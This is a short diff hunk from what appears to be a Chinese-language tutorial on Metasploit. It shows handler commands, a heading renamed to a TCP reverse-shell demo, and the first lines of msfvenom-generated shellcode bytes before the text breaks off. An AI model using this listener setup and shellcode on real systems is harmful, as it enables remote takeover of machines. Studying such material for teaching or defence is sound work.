@@ -51,7 +51,9 @@ msf6 exploit(handler) > set StagerVerifySSLCert true
 msf6 exploit(handler) > exploit -j -z
 ```
 
-以TCP为例，用户通过`msfvenom`生成ShellCode代码，然后将其保存为`shellcode.log`文本文件。
+ - TCP反弹演示
+
+用户通过`msfvenom`生成ShellCode代码，然后将其保存为`shellcode.log`文本文件。
 ```C
 "\xb8\xda\x7e\x23\x13\xdb\xc3\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
 "\x59\x31\x43\x14\x83\xeb\xfc\x03\x43\x10\x38\x8b\xdf\xfb\x33"
